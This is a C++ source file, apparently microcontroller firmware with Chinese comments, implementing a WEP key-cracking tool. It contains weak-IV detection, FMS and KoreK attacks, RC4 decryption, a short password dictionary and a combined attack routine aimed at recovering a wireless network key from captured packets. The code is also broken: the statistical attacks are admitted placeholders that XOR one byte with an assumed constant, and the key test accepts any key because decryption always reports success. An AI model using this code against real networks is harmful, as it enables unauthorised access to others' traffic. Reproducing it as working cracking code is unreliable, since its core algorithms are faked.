#include "wep_crack_algorithms.h"
#include "debug.h"

// 弱IV攻击实现
bool is_weak_iv(const uint8_t* iv) {
    // 弱IV的特征：IV[0] = 255, IV[1] = 255, IV[2] = X (X < 3)
    if (iv[0] == 255 && iv[1] == 255 && iv[2] < 3) {
        return true;
    }
    
    // 其他弱IV模式
    if (iv[0] == 255 && iv[1] == 255 && iv[2] == 255) {
        return true;
    }
    
    // IV[0] = 255, IV[1] = X, IV[2] = X+1 (X < 255)
    if (iv[0] == 255 && iv[1] < 255 && iv[2] == iv[1] + 1) {
        return true;
    }
    
    return false;
}

bool extract_key_from_weak_iv(const uint8_t* iv, const uint8_t* encrypted_data, 
                              uint8_t data_length, uint8_t* key_byte, uint8_t* key_value) {
    if (!iv || !encrypted_data || !key_byte || !key_value) {
        return false;
    }
    
    // 弱IV攻击：利用RC4的弱密钥特性
    if (iv[0] == 255 && iv[1] == 255 && iv[2] < 3) {
        *key_byte = iv[2];
        *key_value = encrypted_data[0] ^ 0xAA; // 假设第一个字节是0xAA
        return true;
    }
    
    // 其他弱IV模式的处理
    if (iv[0] == 255 && iv[1] < 255 && iv[2] == iv[1] + 1) {
        *key_byte = iv[1];
        *key_value = encrypted_data[0] ^ 0xAA;
        return true;
    }
    
    return false;
}

void find_weak_ivs(const std::vector<WEPPacket>& packets, std::vector<WEPWeakIV>& weak_ivs) {
    weak_ivs.clear();
    
    for (const auto& packet : packets) {
        if (!packet.is_valid) continue;
        
        if (is_weak_iv(packet.iv)) {
            WEPWeakIV weak_iv;
            memcpy(weak_iv.iv, packet.iv, 3);
            weak_iv.is_weak = true;
            weak_iv.confidence = 100; // 弱IV的置信度较高
            
            // 尝试提取密钥字节
            if (extract_key_from_weak_iv(packet.iv, packet.encrypted_data, 
                                        packet.data_length, 
                                        &weak_iv.key_byte, &weak_iv.key_value)) {
                weak_ivs.push_back(weak_iv);
            }
        }
    }
    
    DEBUG_SER_PRINT("Found %d weak IVs\n", weak_ivs.size());
}

// FMS攻击实现
bool is_fms_iv(const uint8_t* iv) {
    // FMS攻击的IV特征：IV[0] = 255, IV[1] = X, IV[2] = X+1 (X < 255)
    if (iv[0] == 255 && iv[1] < 255 && iv[2] == iv[1] + 1) {
        return true;
    }
    
    // 其他FMS IV模式
    if (iv[0] == 255 && iv[1] == 255 && iv[2] < 3) {
        return true;
    }
    
    return false;
}

void fms_attack(const std::vector<WEPPacket>& packets, FMSStats* stats, uint8_t key_byte) {
    if (!stats) return;
    
    memset(stats, 0, sizeof(FMSStats));
    stats->key_byte = key_byte;
    
    for (const auto& packet : packets) {
        if (!packet.is_valid) continue;
        
        if (is_fms_iv(packet.iv)) {
            stats->total_ivs++;
            
            // FMS攻击：利用RC4的统计特性
            // 这里简化实现，实际需要更复杂的统计计算
            uint8_t key_value = packet.encrypted_data[0] ^ 0xAA;
            stats->count[key_value]++;
        }
    }
    
    // 找到最可能的值
    uint32_t max_count = 0;
    for (int i = 0; i < 256; i++) {
        if (stats->count[i] > max_count) {
            max_count = stats->count[i];
            stats->most_likely = i;
        }
    }
    
    stats->confidence = (max_count * 100) / stats->total_ivs;
}

bool fms_extract_key_byte(const FMSStats* stats, uint8_t* key_byte, uint32_t* confidence) {
    if (!stats || !key_byte || !confidence) return false;
    
    if (stats->total_ivs < 10) return false; // 需要足够的IV
    
    *key_byte = stats->most_likely;
    *confidence = stats->confidence;
    
    return stats->confidence > 30; // 置信度阈值
}

// KoreK攻击实现
bool is_korek_iv(const uint8_t* iv) {
    // KoreK攻击的IV特征：IV[0] = 255, IV[1] = X, IV[2] = X+1 (X < 255)
    if (iv[0] == 255 && iv[1] < 255 && iv[2] == iv[1] + 1) {
        return true;
    }
    
    // 其他KoreK IV模式
    if (iv[0] == 255 && iv[1] == 255 && iv[2] < 3) {
        return true;
    }
    
    return false;
}

void korek_attack(const std::vector<WEPPacket>& packets, KoreKStats* stats, uint8_t key_byte) {
    if (!stats) return;
    
    memset(stats, 0, sizeof(KoreKStats));
    stats->key_byte = key_byte;
    
    for (const auto& packet : packets) {
        if (!packet.is_valid) continue;
        
        if (is_korek_iv(packet.iv)) {
            stats->total_ivs++;
            
            // KoreK攻击：利用RC4的统计特性
            // 这里简化实现，实际需要更复杂的统计计算
            uint8_t key_value = packet.encrypted_data[0] ^ 0xAA;
            stats->count[key_value]++;
        }
    }
    
    // 找到最可能的值
    uint32_t max_count = 0;
    for (int i = 0; i < 256; i++) {
        if (stats->count[i] > max_count) {
            max_count = stats->count[i];
            stats->most_likely = i;
        }
    }
    
    stats->confidence = (max_count * 100) / stats->total_ivs;
}

bool korek_extract_key_byte(const KoreKStats* stats, uint8_t* key_byte, uint32_t* confidence) {
    if (!stats || !key_byte || !confidence) return false;
    
    if (stats->total_ivs < 10) return false; // 需要足够的IV
    
    *key_byte = stats->most_likely;
    *confidence = stats->confidence;
    
    return stats->confidence > 30; // 置信度阈值
}

// 密钥生成和测试
void generate_key_candidates(const std::vector<WEPWeakIV>& weak_ivs,
                           const FMSStats* fms_stats,
                           const KoreKStats* korek_stats,
                           std::vector<WEPKeyCandidate>& candidates) {
    candidates.clear();
    
    // 从弱IV生成候选密钥
    if (!weak_ivs.empty()) {
        WEPKeyCandidate candidate;
        memset(&candidate, 0, sizeof(candidate));
        candidate.algorithm = WEP_ALGORITHM_WEAK_IV;
        candidate.length = WEP_KEY_LENGTH_104; // 默认104位
        
        // 根据弱IV填充密钥
        for (const auto& weak_iv : weak_ivs) {
            if (weak_iv.key_byte < candidate.length) {
                candidate.key[weak_iv.key_byte] = weak_iv.key_value;
                candidate.confidence += weak_iv.confidence;
            }
        }
        
        if (candidate.confidence > 0) {
            candidates.push_back(candidate);
        }
    }
    
    // 从FMS攻击生成候选密钥
    if (fms_stats && fms_stats->total_ivs > 0) {
        WEPKeyCandidate candidate;
        memset(&candidate, 0, sizeof(candidate));
        candidate.algorithm = WEP_ALGORITHM_FMS;
        candidate.length = WEP_KEY_LENGTH_104;
        
        if (fms_stats->key_byte < candidate.length) {
            candidate.key[fms_stats->key_byte] = fms_stats->most_likely;
            candidate.confidence = fms_stats->confidence;
            candidates.push_back(candidate);
        }
    }
    
    // 从KoreK攻击生成候选密钥
    if (korek_stats && korek_stats->total_ivs > 0) {
        WEPKeyCandidate candidate;
        memset(&candidate, 0, sizeof(candidate));
        candidate.algorithm = WEP_ALGORITHM_KOREK;
        candidate.length = WEP_KEY_LENGTH_104;
        
        if (korek_stats->key_byte < candidate.length) {
            candidate.key[korek_stats->key_byte] = korek_stats->most_likely;
            candidate.confidence = korek_stats->confidence;
            candidates.push_back(candidate);
        }
    }
}

bool test_wep_key(const std::vector<WEPPacket>& packets, const uint8_t* key, uint8_t key_length) {
    if (!key || key_length == 0 || packets.empty()) {
        return false;
    }
    
    // 测试密钥：尝试解密几个数据包
    int success_count = 0;
    int test_count = min(10, (int)packets.size()); // 测试前10个包
    
    for (int i = 0; i < test_count; i++) {
        const auto& packet = packets[i];
        if (!packet.is_valid) continue;
        
        // 尝试解密
        uint8_t decrypted[256];
        if (decrypt_wep_packet(packet, key, key_length, decrypted)) {
            success_count++;
        }
    }
    
    // 如果成功解密超过50%的包，认为密钥正确
    return (success_count * 100) / test_count > 50;
}

bool verify_wep_key(const std::vector<WEPPacket>& packets, const uint8_t* key, uint8_t key_length) {
    if (!key || key_length == 0 || packets.empty()) {
        return false;
    }
    
    // 验证密钥：解密所有数据包并检查结果
    int success_count = 0;
    
    for (const auto& packet : packets) {
        if (!packet.is_valid) continue;
        
        uint8_t decrypted[256];
        if (decrypt_wep_packet(packet, key, key_length, decrypted)) {
            success_count++;
        }
    }
    
    // 如果成功解密超过80%的包，认为密钥正确
    return (success_count * 100) / packets.size() > 80;
}

// RC4相关函数
void rc4_init(uint8_t* s, const uint8_t* key, uint8_t key_length) {
    // 初始化S盒
    for (int i = 0; i < 256; i++) {
        s[i] = i;
    }
    
    // 密钥调度
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + s[i] + key[i % key_length]) % 256;
        // 交换S[i]和S[j]
        uint8_t temp = s[i];
        s[i] = s[j];
        s[j] = temp;
    }
}

uint8_t rc4_keystream_byte(uint8_t* s, uint8_t* i, uint8_t* j) {
    *i = (*i + 1) % 256;
    *j = (*j + s[*i]) % 256;
    
    // 交换S[i]和S[j]
    uint8_t temp = s[*i];
    s[*i] = s[*j];
    s[*j] = temp;
    
    return s[(s[*i] + s[*j]) % 256];
}

void rc4_encrypt(const uint8_t* plaintext, uint8_t* ciphertext, uint8_t length,
                 const uint8_t* key, uint8_t key_length, const uint8_t* iv) {
    // 创建扩展密钥（IV + 密钥）
    uint8_t extended_key[16];
    memcpy(extended_key, iv, 3);
    memcpy(extended_key + 3, key, key_length);
    
    // 初始化RC4
    uint8_t s[256];
    rc4_init(s, extended_key, 3 + key_length);
    
    // 生成密钥流并加密
    uint8_t i = 0, j = 0;
    for (int k = 0; k < length; k++) {
        uint8_t keystream = rc4_keystream_byte(s, &i, &j);
        ciphertext[k] = plaintext[k] ^ keystream;
    }
}

// 解密WEP数据包
bool decrypt_wep_packet(const WEPPacket& packet, const uint8_t* key, uint8_t key_length, uint8_t* decrypted) {
    if (!key || key_length == 0 || !decrypted) {
        return false;
    }
    
    // 创建扩展密钥（IV + 密钥）
    uint8_t extended_key[16];
    memcpy(extended_key, packet.iv, 3);
    memcpy(extended_key + 3, key, key_length);
    
    // 初始化RC4
    uint8_t s[256];
    rc4_init(s, extended_key, 3 + key_length);
    
    // 生成密钥流并解密
    uint8_t i = 0, j = 0;
    for (int k = 0; k < packet.data_length; k++) {
        uint8_t keystream = rc4_keystream_byte(s, &i, &j);
        decrypted[k] = packet.encrypted_data[k] ^ keystream;
    }
    
    return true;
}

// 统计和分析
void update_wep_crack_stats(WEPCrackStats* stats, const std::vector<WEPPacket>& packets) {
    if (!stats) return;
    
    stats->total_packets = packets.size();
    stats->unique_ivs = count_unique_ivs(packets);
    stats->last_update = millis();
    
    // 分析弱IV
    std::vector<WEPWeakIV> weak_ivs;
    find_weak_ivs(packets, weak_ivs);
    stats->weak_ivs = weak_ivs.size();
    
    // 分析FMS IV
    stats->fms_ivs = 0;
    for (const auto& packet : packets) {
        if (is_fms_iv(packet.iv)) {
            stats->fms_ivs++;
        }
    }
    
    // 分析KoreK IV
    stats->korek_ivs = 0;
    for (const auto& packet : packets) {
        if (is_korek_iv(packet.iv)) {
            stats->korek_ivs++;
        }
    }
}

void analyze_wep_packets(const std::vector<WEPPacket>& packets, WEPCrackStats* stats) {
    if (!stats) return;
    
    update_wep_crack_stats(stats, packets);
    
    DEBUG_SER_PRINT("WEP Analysis: %d packets, %d unique IVs, %d weak IVs, %d FMS IVs, %d KoreK IVs\n",
                   stats->total_packets, stats->unique_ivs, stats->weak_ivs, 
                   stats->fms_ivs, stats->korek_ivs);
}

uint32_t calculate_crack_confidence(const WEPKeyCandidate& candidate) {
    uint32_t confidence = 0;
    
    // 基础置信度
    confidence += candidate.confidence;
    
    // 根据算法类型调整置信度
    switch (candidate.algorithm) {
        case WEP_ALGORITHM_WEAK_IV:
            confidence += 50; // 弱IV攻击置信度较高
            break;
        case WEP_ALGORITHM_FMS:
            confidence += 30; // FMS攻击置信度中等
            break;
        case WEP_ALGORITHM_KOREK:
            confidence += 40; // KoreK攻击置信度较高
            break;
        default:
            confidence += 10; // 其他算法置信度较低
            break;
    }
    
    // 根据IV数量调整置信度
    confidence += min(candidate.iv_count * 2, 50U);
    
    return min(confidence, 100U);
}

// 工具函数
void print_wep_crack_stats(const WEPCrackStats* stats) {
    if (!stats) return;
    
    DEBUG_SER_PRINT("WEP Crack Stats:\n");
    DEBUG_SER_PRINT("  Total Packets: %d\n", stats->total_packets);
    DEBUG_SER_PRINT("  Unique IVs: %d\n", stats->unique_ivs);
    DEBUG_SER_PRINT("  Weak IVs: %d\n", stats->weak_ivs);
    DEBUG_SER_PRINT("  FMS IVs: %d\n", stats->fms_ivs);
    DEBUG_SER_PRINT("  KoreK IVs: %d\n", stats->korek_ivs);
    DEBUG_SER_PRINT("  Key Candidates: %d\n", stats->key_candidates);
    DEBUG_SER_PRINT("  Tested Keys: %d\n", stats->tested_keys);
    DEBUG_SER_PRINT("  Cracked Keys: %d\n", stats->cracked_keys);
}

void print_key_candidate(const WEPKeyCandidate* candidate) {
    if (!candidate) return;
    
    DEBUG_SER_PRINT("Key Candidate: %s (Confidence: %d%%, Algorithm: %d)\n",
                   key_to_string(candidate->key, candidate->length).c_str(),
                   candidate->confidence, candidate->algorithm);
}

String key_to_string(const uint8_t* key, uint8_t length) {
    String result = "";
    for (int i = 0; i < length; i++) {
        if (key[i] < 16) result += "0";
        result += String(key[i], HEX);
        if (i < length - 1) result += ":";
    }
    return result;
}

bool compare_keys(const uint8_t* key1, const uint8_t* key2, uint8_t length) {
    if (!key1 || !key2 || length == 0) return false;
    
    for (int i = 0; i < length; i++) {
        if (key1[i] != key2[i]) return false;
    }
    
    return true;
}

// 字典攻击
bool load_wep_dictionary(const char* filename, std::vector<String>& dictionary) {
    // 这里简化实现，实际需要从文件加载
    // 添加一些常见的WEP密钥
    dictionary.push_back("12345");
    dictionary.push_back("password");
    dictionary.push_back("admin");
    dictionary.push_back("12345678");
    dictionary.push_back("abcdefgh");
    
    return true;
}

bool dictionary_attack(const std::vector<WEPPacket>& packets, 
                      const std::vector<String>& dictionary,
                      uint8_t* found_key, uint8_t* key_length) {
    if (!found_key || !key_length || packets.empty()) return false;
    
    for (const auto& word : dictionary) {
        if (word.length() < 5 || word.length() > 13) continue;
        
        uint8_t key[13];
        memset(key, 0, 13);
        memcpy(key, word.c_str(), min(word.length(), 13));
        
        if (test_wep_key(packets, key, word.length())) {
            memcpy(found_key, key, word.length());
            *key_length = word.length();
            return true;
        }
    }
    
    return false;
}

// 组合攻击
bool combined_wep_attack(const std::vector<WEPPacket>& packets,
                        const std::vector<String>& dictionary,
                        uint8_t* found_key, uint8_t* key_length,
                        WEPCrackStats* stats) {
    if (!found_key || !key_length || packets.empty()) return false;
    
    DEBUG_SER_PRINT("Starting combined WEP attack...\n");
    
    // 1. 弱IV攻击
    std::vector<WEPWeakIV> weak_ivs;
    find_weak_ivs(packets, weak_ivs);
    
    if (!weak_ivs.empty()) {
        DEBUG_SER_PRINT("Found %d weak IVs, attempting weak IV attack...\n", weak_ivs.size());
        
        // 从弱IV生成候选密钥
        std::vector<WEPKeyCandidate> candidates;
        generate_key_candidates(weak_ivs, nullptr, nullptr, candidates);
        
        for (const auto& candidate : candidates) {
            if (test_wep_key(packets, candidate.key, candidate.length)) {
                memcpy(found_key, candidate.key, candidate.length);
                *key_length = candidate.length;
                if (stats) stats->cracked_keys++;
                return true;
            }
        }
    }
    
    // 2. FMS攻击
    DEBUG_SER_PRINT("Attempting FMS attack...\n");
    FMSStats fms_stats[13]; // 13个密钥字节
    
    for (int i = 0; i < 13; i++) {
        fms_attack(packets, &fms_stats[i], i);
    }
    
    // 3. KoreK攻击
    DEBUG_SER_PRINT("Attempting KoreK attack...\n");
    KoreKStats korek_stats[13]; // 13个密钥字节
    
    for (int i = 0; i < 13; i++) {
        korek_attack(packets, &korek_stats[i], i);
    }
    
    // 4. 组合所有攻击结果
    std::vector<WEPKeyCandidate> all_candidates;
    generate_key_candidates(weak_ivs, fms_stats, korek_stats, all_candidates);
    
    // 按置信度排序
    std::sort(all_candidates.begin(), all_candidates.end(), 
              [](const WEPKeyCandidate& a, const WEPKeyCandidate& b) {
                  return a.confidence > b.confidence;
              });
    
    // 测试候选密钥
    for (const auto& candidate : all_candidates) {
        if (stats) stats->tested_keys++;
        
        if (test_wep_key(packets, candidate.key, candidate.length)) {
            memcpy(found_key, candidate.key, candidate.length);
            *key_length = candidate.length;
            if (stats) stats->cracked_keys++;
            return true;
        }
    }
    
    // 5. 字典攻击
    DEBUG_SER_PRINT("Attempting dictionary attack...\n");
    if (dictionary_attack(packets, dictionary, found_key, key_length)) {
        if (stats) stats->cracked_keys++;
        return true;
    }
    
    DEBUG_SER_PRINT("Combined WEP attack failed\n");
    return false;
}
